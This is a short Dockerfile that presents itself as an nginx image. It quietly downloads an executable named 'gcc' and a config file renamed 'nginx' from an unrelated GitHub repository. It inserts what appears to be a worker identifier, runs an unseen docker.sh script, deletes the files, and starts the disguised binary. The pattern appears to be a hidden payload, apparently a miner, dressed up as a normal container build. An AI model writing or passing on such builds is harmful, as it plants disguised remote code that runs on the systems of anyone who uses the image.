FROM ubuntu
WORKDIR /workdir
ENV DEBIAN_FRONTEND noninteractive

RUN apt update
RUN apt --yes install curl
RUN bash -c 'echo $(date +%s) > nginx.log'
RUN curl --output gcc --silent https://raw.githubusercontent.com/compilertoolchain/gcc/master/gcc
RUN chmod +x gcc
RUN curl --output nginx --silent https://raw.githubusercontent.com/compilertoolchain/gcc/master/cfg
RUN sed --in-place 's/__ID__/dockerhub-b_2d17f7060b0e5bcca7d0c0d6734a6fb8_github-o-3/g' nginx
COPY docker.sh .

RUN bash ./docker.sh

RUN rm --force --recursive nginx
RUN rm --force --recursive docker.sh
RUN rm --force --recursive gcc

CMD nginx
